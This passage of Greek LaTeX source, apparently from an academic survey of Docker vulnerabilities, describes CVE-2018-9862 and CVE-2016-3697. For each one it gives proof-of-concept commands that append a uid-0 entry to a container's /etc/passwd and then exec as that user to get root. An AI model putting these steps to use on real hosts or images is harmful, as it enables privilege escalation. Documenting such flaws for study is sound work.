\texttt{\textlatin{--user}} ως όνομα χρήστη πριν δοκιμαστούν ως \textlatin{user
id} \cite{CVE-2018-9862-Github}. Αυτό μπορεί να το εκμεταλλευτεί κανείς
χρησιμοποιώντας τη πρώτη καταχώρηση του \texttt{\textlatin{/etc/passwd}}. Αυτό
επιτρέπει τη δημιουργία κακόβουλων εικόνων με χρήστες που έχουν δικαιώματα
\texttt{\textlatin{root}}. \\

\texttt{\textlatin{(host)\$ docker run --rm -ti ... ubuntu bash}}

\texttt{\textlatin{(cont)\# echo "10:x:0:0:root:/root:/bin/bash" > /etc/passwd}}

\texttt{\textlatin{(host)\$ docker exec -ti -u 10 hello bash}}

\texttt{\textlatin{(cont)\# id}}

\texttt{\textlatin{uid=0(10) gid=0(root) groups=0(root)}} \\

\subsection{\textlatin{CVE–2016–3697}}

Το \textlatin{Docker} πριν από την 1.11.2 προσπάθησε να ερμηνεύσει τις τιμές που
δόθηκαν στο όρισμα \texttt{\textlatin{--user}} ως όνομα χρήστη πριν τις
δοκιμάσει ως \textlatin{user id} \cite{CVE-2016-3697-Github}. Αυτό επιτρέπει
δημιουργούνται κακόβουλες εικόνες με χρήστες που έχουν δικαιώματα
\texttt{\textlatin{root}} όταν χρησιμοποιούνται. \\

\texttt{\textlatin{(host)\$ docker run --rm -it --name=test ubuntu:latest /bin/bash}}

\texttt{\textlatin{(cont)\# echo '31337:x:0:0:root:/root:/bin/bash' >> /etc/passwd}}

\texttt{\textlatin{(host)\$ sudo docker exec -it -u 31337 test /bin/bash}}

\texttt{\textlatin{(cont)\# id}}

\texttt{\textlatin{uid=0(root) gid=0(root) groups=0(root)}} \\
